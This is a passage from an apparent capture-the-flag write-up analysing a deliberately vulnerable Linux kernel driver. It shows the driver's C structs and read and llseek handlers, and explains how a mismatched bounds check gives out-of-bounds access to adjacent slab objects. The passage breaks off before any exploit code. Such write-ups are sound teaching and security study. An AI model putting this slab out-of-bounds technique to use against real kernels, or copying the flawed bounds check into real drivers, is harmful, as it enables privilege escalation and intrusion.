+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span><span style="color:#7f848e">#define TYPE_FILE 1
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span><span style="color:#7f848e">// this should be the only flags needed. should not be leaked to userspace
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span><span style="color:#7f848e">#define DEFAULT_FLAGS 0x7d333a7b66746362
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span><span style="color:#7f848e">#define NAME_SIZE 16
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span><span style="color:#7f848e">#define DATA_COUNT 16
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span><span style="color:#7f848e">#define MAX_RW_SIZE 64
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span><span style="color:#c678dd">typedef</span> <span style="color:#c678dd">struct</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>    <span style="color:#e06c75">u64</span> <span style="color:#e06c75">type</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>    <span style="color:#e06c75">u64</span> <span style="color:#e06c75">flags</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span>    <span style="color:#e5c07b">char</span> <span style="color:#e06c75">name</span>[<span style="color:#e06c75">NAME_SIZE</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>    <span style="color:#e06c75">u64</span> <span style="color:#e06c75">data</span>[<span style="color:#e06c75">DATA_COUNT</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span>} <span style="color:#e06c75">MultiFile</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">17</span><span><span style="color:#7f848e">#define NUM_SLOTS 67
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">19</span><span><span style="color:#c678dd">typedef</span> <span style="color:#c678dd">struct</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">20</span><span>    <span style="color:#c678dd">struct</span> <span style="color:#e06c75">mutex</span> <span style="color:#e06c75">lock</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">21</span><span>    <span style="color:#e06c75">MultiFile</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">files</span>[<span style="color:#e06c75">NUM_SLOTS</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">22</span><span>    <span style="color:#e06c75">u32</span> <span style="color:#e06c75">active_idx</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">23</span><span>} <span style="color:#e06c75">MultiFileList</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">24</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">25</span><span><span style="color:#c678dd">typedef</span> <span style="color:#c678dd">struct</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">26</span><span>    <span style="color:#e5c07b">char</span> <span style="color:#e06c75">name</span>[<span style="color:#d19a66">16</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">27</span><span>} <span style="color:#e06c75">MultiFileCreateReq</span>;
+</span></span></code></pre></div><p>A few things to note from this:</p>
+<ul>
+<li><code>MultiFile</code> is <code>0xa0</code> bytes (<code>0x10</code> header of <code>type</code>+<code>flags</code> + <code>0x10</code> <code>name</code> + <code>0x80</code> <code>data</code>). These are the objects allocated from <code>multifiles_cache</code>, one per <code>ioctl(CREATE)</code>.</li>
+<li>Each <code>open()</code> allocates one <code>MultiFileList</code> (stored in <code>file-&gt;private_data</code>), which holds up to <code>NUM_SLOTS = 67</code> <code>MultiFile</code> pointers in <code>files[]</code>. So a single fd can keep up to 67 live objects, and the index returned by <code>CREATE</code> is just the slot in this per-fd array. <code>active_idx</code> selects which slot <code>read</code>/<code>write</code> operate on.</li>
+<li><code>DEFAULT_FLAGS = 0x7d333a7b66746362</code> is set on every freshly created <code>MultiFile</code>, and the source explicitly comments it <em>should not be leaked to userspace</em>. In ASCII that&rsquo;s <code>bctf{:3}</code> — a deliberate canary. Note <strong>where</strong> it lives: offset <code>0x08</code>, inside the <code>type</code>+<code>flags</code> header. As we&rsquo;ll see, the cache&rsquo;s usercopy region starts at <code>name</code> (<code>0x10</code>), so this header sits <em>outside</em> what <code>copy_to/from_user</code> is allowed to touch — which is exactly what stops us from leaking it directly.</li>
+</ul>
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<p>Looking at <code>multifiles_read</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span>  <span style="color:#d19a66">150</span>  <span style="color:#c678dd">static</span> <span style="color:#e5c07b">ssize_t</span> <span style="color:#61afef;font-weight:bold">multifiles_read</span>(<span style="color:#c678dd">struct</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">self</span>, <span style="color:#e5c07b">char</span> <span style="color:#e06c75">__user</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">buf</span>, <span style="color:#e5c07b">size_t</span> <span style="color:#e06c75">count</span>, <span style="color:#e5c07b">loff_t</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">offset</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>  <span style="color:#d19a66">151</span>      <span style="color:#e06c75">MultiFileList</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">list</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">self</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">private_data</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>  <span style="color:#d19a66">152</span>      <span style="color:#e5c07b">ssize_t</span> <span style="color:#e06c75">ret</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>  <span style="color:#d19a66">153</span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">list</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>  <span style="color:#d19a66">154</span>          <span style="color:#c678dd">return</span> <span style="color:#56b6c2">-</span><span style="color:#e06c75">EINVAL</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>  <span style="color:#d19a66">155</span>      }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>  <span style="color:#d19a66">156</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>  <span style="color:#d19a66">157</span>      <span style="color:#61afef;font-weight:bold">mutex_lock</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">list</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">lock</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>  <span style="color:#d19a66">158</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>  <span style="color:#d19a66">159</span>      <span style="color:#7f848e">// check index is selected
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>  <span style="color:#d19a66">160</span>      <span style="color:#e06c75">MultiFile</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">multi_file</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_active_file</span>(<span style="color:#e06c75">list</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>  <span style="color:#d19a66">161</span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">multi_file</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span>  <span style="color:#d19a66">162</span>          <span style="color:#e06c75">ret</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#e06c75">ENOENT</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>  <span style="color:#d19a66">163</span>          <span style="color:#c678dd">goto</span> <span style="color:#e06c75">out_unlock</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span>  <span style="color:#d19a66">164</span>      }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">16</span><span>  <span style="color:#d19a66">165</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">17</span><span>  <span style="color:#d19a66">166</span>      <span style="color:#7f848e">// check read bounds
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">18</span><span>  <span style="color:#d19a66">167</span>      <span style="color:#c678dd">if</span> (
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">19</span><span>  <span style="color:#d19a66">168</span>          <span style="color:#e06c75">count</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">MAX_RW_SIZE</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">20</span><span>  <span style="color:#d19a66">169</span>          <span style="color:#56b6c2">||</span> (<span style="color:#e06c75">count</span> <span style="color:#56b6c2">%</span> <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">u64</span>)) <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">21</span><span>  <span style="color:#d19a66">170</span>          <span style="color:#56b6c2">||</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">offset</span> <span style="color:#56b6c2">&gt;=</span> <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">MultiFile</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">22</span><span>  <span style="color:#d19a66">171</span>          <span style="color:#56b6c2">||</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">offset</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">23</span><span>  <span style="color:#d19a66">172</span>      ) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">24</span><span>  <span style="color:#d19a66">173</span>          <span style="color:#e06c75">ret</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#e06c75">EINVAL</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">25</span><span>  <span style="color:#d19a66">174</span>          <span style="color:#c678dd">goto</span> <span style="color:#e06c75">out_unlock</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">26</span><span>  <span style="color:#d19a66">175</span>      }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">27</span><span>  <span style="color:#d19a66">176</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">28</span><span>  <span style="color:#d19a66">177</span>      <span style="color:#e5c07b">loff_t</span> <span style="color:#e06c75">old_offset</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">offset</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">29</span><span>  <span style="color:#d19a66">178</span>      <span style="color:#56b6c2">*</span><span style="color:#e06c75">offset</span> <span style="color:#56b6c2">+=</span> <span style="color:#e06c75">count</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">30</span><span>  <span style="color:#d19a66">179</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">31</span><span>  <span style="color:#d19a66">180</span>      <span style="color:#c678dd">if</span> (<span style="color:#61afef;font-weight:bold">kmem_cache_copy_to_user</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">32</span><span>  <span style="color:#d19a66">181</span>          <span style="color:#e06c75">multifiles_cache</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">33</span><span>  <span style="color:#d19a66">182</span>          <span style="color:#e06c75">buf</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">34</span><span>  <span style="color:#d19a66">183</span>          ((<span style="color:#e06c75">u8</span> <span style="color:#56b6c2">*</span>) <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">multi_file</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">data</span>[<span style="color:#d19a66">0</span>]) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">old_offset</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">35</span><span>  <span style="color:#d19a66">184</span>          <span style="color:#e06c75">count</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">36</span><span>  <span style="color:#d19a66">185</span>      ) <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">37</span><span>  <span style="color:#d19a66">186</span>          <span style="color:#e06c75">ret</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#e06c75">EFAULT</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">38</span><span>  <span style="color:#d19a66">187</span>          <span style="color:#c678dd">goto</span> <span style="color:#e06c75">out_unlock</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">39</span><span>  <span style="color:#d19a66">188</span>      }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">40</span><span>  <span style="color:#d19a66">189</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">41</span><span>  <span style="color:#d19a66">190</span>      <span style="color:#e06c75">ret</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">count</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">42</span><span>  <span style="color:#d19a66">191</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">43</span><span>  <span style="color:#d19a66">192</span>  <span style="color:#e06c75">out_unlock</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">44</span><span>  <span style="color:#d19a66">193</span>      <span style="color:#61afef;font-weight:bold">mutex_unlock</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">list</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">lock</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">45</span><span>  <span style="color:#d19a66">194</span>      <span style="color:#c678dd">return</span> <span style="color:#e06c75">ret</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">46</span><span>  <span style="color:#d19a66">195</span>  }
+</span></span></code></pre></div><p><code>multifiles_write</code> is similar.</p>
+<p>The bounds check validates <code>offset</code> against <code>sizeof(MultiFile) = 0xa0</code>, but the actual copy base is <code>&amp;multi_file-&gt;data[0] + offset = obj+0x20+offset</code>. So at <code>offset=0x80</code> the copy starts at <code>obj+0xa0</code> — exactly the first byte of the next adjacent slab object.</p>
+<p>Now <code>multifiles_llseek</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 1</span><span>  <span style="color:#d19a66">244</span>  <span style="color:#e5c07b">loff_t</span> <span style="color:#61afef;font-weight:bold">multifiles_llseek</span>(<span style="color:#c678dd">struct</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">self</span>, <span style="color:#e5c07b">loff_t</span> <span style="color:#e06c75">offset</span>, <span style="color:#e5c07b">int</span> <span style="color:#e06c75">whence</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 2</span><span>  <span style="color:#d19a66">245</span>      <span style="color:#e06c75">MultiFileList</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">list</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">self</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">private_data</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 3</span><span>  <span style="color:#d19a66">246</span>      <span style="color:#c678dd">if</span> (
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 4</span><span>  <span style="color:#d19a66">247</span>          <span style="color:#e06c75">list</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">NULL</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 5</span><span>  <span style="color:#d19a66">248</span>          <span style="color:#7f848e">// too lazy to support other types
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 6</span><span>  <span style="color:#d19a66">249</span>          <span style="color:#56b6c2">||</span> <span style="color:#e06c75">whence</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">SEEK_SET</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 7</span><span>  <span style="color:#d19a66">250</span>          <span style="color:#56b6c2">||</span> <span style="color:#e06c75">offset</span> <span style="color:#56b6c2">&gt;=</span> <span style="color:#c678dd">sizeof</span>(<span style="color:#e06c75">MultiFile</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 8</span><span>  <span style="color:#d19a66">251</span>          <span style="color:#56b6c2">||</span> <span style="color:#e06c75">offset</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f"> 9</span><span>  <span style="color:#d19a66">252</span>      ) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">10</span><span>  <span style="color:#d19a66">253</span>          <span style="color:#c678dd">return</span> <span style="color:#56b6c2">-</span><span style="color:#e06c75">EINVAL</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">11</span><span>  <span style="color:#d19a66">254</span>      }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">12</span><span>  <span style="color:#d19a66">255</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">13</span><span>  <span style="color:#d19a66">256</span>      <span style="color:#61afef;font-weight:bold">mutex_lock</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">list</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">lock</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">14</span><span>  <span style="color:#d19a66">257</span>      <span style="color:#e06c75">self</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">f_pos</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">offset</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">15</span><span>  <span style="color:#d19a66">258</span>      <span style="color:#61afef;font-weight:bold">mutex_unlock</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">list</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">lock</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">16</span><span>  <span style="color:#d19a66">259</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">17</span><span>  <span style="color:#d19a66">260</span>      <span style="color:#c678dd">return</span> <span style="color:#e06c75">offset</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">18</span><span>  <span style="color:#d19a66">261</span>  }
+</span></span></code></pre></div><p><code>llseek</code> lets us set <code>f_pos</code> (the file position) to any value in <code>[0, 0xa0)</code>. Combined with the mismatched copy base, this gives a controlled OOB window into the next adjacent slab object.</p>
+<p>It&rsquo;s worth being precise about <em>why</em> <code>f_pos</code> is the same thing as the <code>loff_t *offset</code> that <code>multifiles_read</code>/<code>multifiles_write</code> receive. When userspace calls <code>read(fd, buf, n)</code>, the VFS path <code>ksys_read()</code> (in <code>fs/read_write.c</code>) does roughly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">1</span><span><span style="color:#e5c07b">loff_t</span> <span style="color:#e06c75">pos</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">file_pos_read</span>(<span style="color:#e06c75">file</span>);     <span style="color:#7f848e">// copy of file-&gt;f_pos
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#55595f">2</span><span><span style="color:#61afef;font-weight:bold">vfs_read</span>(<span style="color:#e06c75">file</span>, <span style="color:#e06c75">buf</span>, <span style="color:#e06c75">n</span>, <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">pos</span>);         <span style="color:#7f848e">// -&gt; file-&gt;f_op-&gt;read(file, buf, n, &amp;pos)
